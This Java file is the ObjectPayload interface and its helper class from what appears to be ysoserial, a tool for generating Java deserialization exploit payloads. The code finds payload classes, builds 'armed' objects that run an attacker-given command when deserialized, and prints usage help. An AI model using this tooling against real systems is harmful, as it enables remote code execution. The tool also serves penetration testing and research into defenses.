package ysoserial.payloads;


import java.io.PrintStream;
import java.lang.reflect.Modifier;
import java.util.Iterator;
import java.util.Set;

import org.apache.commons.cli.ParseException;
import org.reflections.Reflections;

import ysoserial.GeneratePayload;
import ysoserial.Serializer;
import ysoserial.payloads.util.Gadgets;


@SuppressWarnings ( "rawtypes" )
public interface ObjectPayload <T> {

    /*
     * return armed payload object to be serialized that will execute specified
     * command on deserialization
     */
    public T getObject ( String command ) throws Exception;

    public static class Utils {

        // get payload classes by classpath scanning
        public static Set<Class<? extends ObjectPayload>> getPayloadClasses () {
            final Reflections reflections = new Reflections(ObjectPayload.class.getPackage().getName());
            final Set<Class<? extends ObjectPayload>> payloadTypes = reflections.getSubTypesOf(ObjectPayload.class);
            for ( Iterator<Class<? extends ObjectPayload>> iterator = payloadTypes.iterator(); iterator.hasNext(); ) {
                Class<? extends ObjectPayload> pc = iterator.next();
                if ( pc.isInterface() || Modifier.isAbstract(pc.getModifiers()) ) {
                    iterator.remove();
                }
            }
            return payloadTypes;
        }


        @SuppressWarnings ( "unchecked" )
        public static Class<? extends ObjectPayload> getPayloadClass ( final String className ) {
            Class<? extends ObjectPayload> clazz = null;
            try {
                clazz = (Class<? extends ObjectPayload>) Class.forName(className);
            }
            catch ( Exception e1 ) {}
            if ( clazz == null ) {
                try {
                    return clazz = (Class<? extends ObjectPayload>) Class
                            .forName(GeneratePayload.class.getPackage().getName() + ".payloads." + className);
                }
                catch ( Exception e2 ) {}
            }
            if ( clazz != null && !ObjectPayload.class.isAssignableFrom(clazz) ) {
                clazz = null;
            }
            return clazz;
        }


        public static Object makePayloadObject ( String payloadType, String[] payloadArgs ) throws IllegalArgumentException {
            final Class<? extends ObjectPayload> payloadClass = Utils.getPayloadClass(payloadType);
            if (payloadClass == null) {
                throw new IllegalArgumentException("Invalid payload type '" + payloadType + "'");
            }

            try {
                final ObjectPayload payload = payloadClass.newInstance();
                if (payloadArgs.length == 0) {
                    if (payload instanceof ParameterizedObjectPayload) {
                        throw new IllegalArgumentException(((ParameterizedObjectPayload) payload).getHelp()
                            + "\r\n" + "Override generated classes prefix using 'ysoserial.class_prefix' property (default: javax.objects.Object)");
                    } else {
                        throw new IllegalArgumentException("Usage: java -jar ysoserial-[version]-all.jar " + payloadType + " '[command]'"
                            + "\r\n" + "Override generated classes prefix using 'ysoserial.class_prefix' property (default: javax.objects.Object)");
                    }
                }

                final Object object;
                if (payload instanceof ParameterizedObjectPayload) {
                    ParameterizedObjectPayload parameterizedPayload = (ParameterizedObjectPayload) payload;
                    try {
                        object = parameterizedPayload.getObject(payloadArgs);
                    } catch (ParseException e) {
                        System.err.println("Error: " + e.getMessage());
                        System.err.println(parameterizedPayload.getHelp());

                        throw new IllegalArgumentException("Error: " + e.getMessage()
                            + "\r\n" + parameterizedPayload.getHelp());
                    } catch (IllegalArgumentException e) {
                        String errorMsg = "";
                        if (e.getMessage() != null) {
                            errorMsg += "Error: " + e.getMessage() + "\r\n";
                        }
                        throw new IllegalArgumentException(errorMsg + parameterizedPayload.getHelp());
                    }
                } else {
                    if (payloadArgs.length > 1) {
                        throw new IllegalArgumentException("Error: the payload '" + payloadType + "' does not support multiple arguments"
                            + "\r\n" + "Usage: java -jar ysoserial-[version]-all.jar " + payloadType + " '[command]'");
                    }
                    object = payload.getObject(payloadArgs[0]);
                }
                return object;
            } catch (Throwable tr) {
                if (tr instanceof IllegalStateException
                    || tr instanceof IllegalArgumentException)
                    throw (RuntimeException)tr;
                throw new RuntimeException("Could not build payload of type '" + payloadType + "'", tr);
            }
        }


        @SuppressWarnings ( "unchecked" )
        public static void releasePayload ( ObjectPayload payload, Object object ) throws Exception {
            if ( payload instanceof ReleaseableObjectPayload ) {
                ( (ReleaseableObjectPayload) payload ).release(object);
            }
        }


        public static void releasePayload ( String payloadType, Object payloadObject ) {
            final Class<? extends ObjectPayload> payloadClass = getPayloadClass(payloadType);
            if ( payloadClass == null || !ObjectPayload.class.isAssignableFrom(payloadClass) ) {
                throw new IllegalArgumentException("Invalid payload type '" + payloadType + "'");

            }

            try {
                final ObjectPayload payload = payloadClass.newInstance();
                releasePayload(payload, payloadObject);
            }
            catch ( Exception e ) {
                e.printStackTrace();
            }

        }
    }
}
